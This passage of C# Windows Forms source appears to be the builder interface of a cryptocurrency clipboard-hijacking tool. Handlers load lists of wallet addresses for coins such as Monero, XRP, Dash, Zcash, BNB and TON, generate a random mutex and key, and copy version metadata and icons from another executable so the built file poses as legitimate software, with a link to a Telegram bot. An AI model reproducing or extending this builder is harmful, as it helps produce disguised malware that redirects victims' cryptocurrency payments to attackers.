                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton6.Enabled = false;
                                xmr = LoadTxt(ofd.FileName);
                                toolStripLabel_xmr.Text = (xmr.Trim().Split(',').Length - 1).ToString();
                                metroButton6.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton5_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton5.Enabled = false;
                                xlm = LoadTxt(ofd.FileName);
                                toolStripLabel_xlm.Text = (xlm.Trim().Split(',').Length - 1).ToString();
                                metroButton5.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton14_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton14.Enabled = false;
                                xrp = LoadTxt(ofd.FileName);
                                toolStripLabel_xrp.Text = (xrp.Trim().Split(',').Length - 1).ToString();
                                metroButton14.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton13_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton13.Enabled = false;
                                nec = LoadTxt(ofd.FileName);
                                toolStripLabel_nec.Text = (nec.Trim().Split(',').Length - 1).ToString();
                                metroButton13.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton12_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton12.Enabled = false;
                                dash = LoadTxt(ofd.FileName);
                                toolStripLabel_dash.Text = (dash.Trim().Split(',').Length - 1).ToString();
                                metroButton12.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton10_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton10.Enabled = false;
                                zcash = LoadTxt(ofd.FileName);
                                toolStripLabel_zec.Text = (zcash.Trim().Split(',').Length - 1).ToString();
                                metroButton10.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }

        private async void metroButton15_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton15.Enabled = false;
                                bnb = LoadTxt(ofd.FileName);
                                toolStripLabel_ton.Text = (bnb.Trim().Split(',').Length - 1).ToString();
                                metroButton15.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }

        }

        private void metroButton17_Click(object sender, EventArgs e)
        {
            txt_mutex.Text = Helpers.Random(16);
        }

        private void metroButton11_Click(object sender, EventArgs e)
        {
            txt_key.Text = Helpers.Random(16);
        }

        private void metroButton9_Click(object sender, EventArgs e)
        {
            using (var openFileDialog = new OpenFileDialog())
            {
                openFileDialog.Filter = "Executable (*.exe)|*.exe";
                if (openFileDialog.ShowDialog() == DialogResult.OK)
                {
                    var fileVersionInfo = FileVersionInfo.GetVersionInfo(openFileDialog.FileName);

                    txt_Original_Name.Text = fileVersionInfo.InternalName ?? string.Empty;
                    txt_Description.Text = fileVersionInfo.FileDescription ?? string.Empty;
                    txt_Company.Text = fileVersionInfo.CompanyName ?? string.Empty;
                    txt_Product.Text = fileVersionInfo.ProductName ?? string.Empty;
                    txt_Copyright.Text = fileVersionInfo.LegalCopyright ?? string.Empty;
                    txt_Trademarks.Text = fileVersionInfo.LegalTrademarks ?? string.Empty;

                    var version = fileVersionInfo.FileMajorPart;
                    txt_File_Version.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                    txt_Version.Text = $"{fileVersionInfo.FileMajorPart.ToString()}.{fileVersionInfo.FileMinorPart.ToString()}.{fileVersionInfo.FileBuildPart.ToString()}.{fileVersionInfo.FilePrivatePart.ToString()}";
                }
            }
        }

        private void metroButton16_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Choose Icon";
                ofd.Filter = "Icons Files(*.exe;*.ico;)|*.exe;*.ico";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    if (ofd.FileName.ToLower().EndsWith(".exe"))
                    {
                        string ico = GetIcon(ofd.FileName);
                        picIcon.ImageLocation = ico;
                        buildicon = ico;
                    }
                    else
                    {
                        buildicon = ofd.FileName;
                        picIcon.ImageLocation = ofd.FileName;
                    }
                }
            }

            
        }
        private string GetIcon(string path)
        {
            try
            {
                string tempFile = Path.GetTempFileName() + ".ico";
                using (FileStream fs = new FileStream(tempFile, FileMode.Create))
                {
                    IconExtractor.Extract1stIconTo(path, fs);
                }
                return tempFile;
            }
            catch { }
            return "";
        }

        private void metroToggle_assembly_CheckedChanged(object sender, EventArgs e)
        {
            Assembly_Checked();
        }

        public void Assembly_Checked() 
        {
            if (metroToggle_assembly.Checked)
            {
                metroButton9.Enabled = true;
                txt_Product.Enabled = true;
                txt_Description.Enabled = true;
                txt_Company.Enabled = true;
                txt_Copyright.Enabled = true;
                txt_Trademarks.Enabled = true;
                txt_Original_Name.Enabled = true;
                txt_Version.Enabled = true;
                txt_File_Version.Enabled = true;
            }
            else 
            {
                metroButton9.Enabled = false;
                txt_Product.Enabled = false;
                txt_Description.Enabled = false;
                txt_Company.Enabled = false;
                txt_Copyright.Enabled = false;
                txt_Trademarks.Enabled = false;
                txt_Original_Name.Enabled = false;
                txt_Version.Enabled = false;
                txt_File_Version.Enabled = false;
            }

        }

        private void metroToggle_icon_Build_CheckedChanged(object sender, EventArgs e)
        {
            Icon_Checked();
        }

        public void Icon_Checked() 
        {
            if (metroToggle_icon_Build.Checked)
            {
                metroButton16.Enabled = true;
                picIcon.Enabled = true;
            }
            else
            {
                metroButton16.Enabled = false;
                picIcon.Enabled = false;
            }
        }

       
        private void metroLink1_Click(object sender, EventArgs e)
        {
            Process.Start("https://t.me/devxstudiobot");
        }

        private async void metroButton19_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Title = "Select *.txt file with addresses 1 per line...";
                ofd.Filter = ".txt (*.txt)|*.txt";
                ofd.Multiselect = false;
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    await Task.Run(() =>
                    {
                        try
                        {
                            if (LoadTxt(ofd.FileName).Trim().Split(',').Length != 1)
                            {
                                metroButton19.Enabled = false;
                                ton = LoadTxt(ofd.FileName);
                                toolStripLabel_ton.Text = (ton.Trim().Split(',').Length - 1).ToString();
                                metroButton19.Enabled = true;
                            }
                            else
                            {
                                MessageBox.Show("Wallet's Not Found, 0 lines");
                            }
                        }
                        catch { };
                    });

                }

            }
        }
    }
}
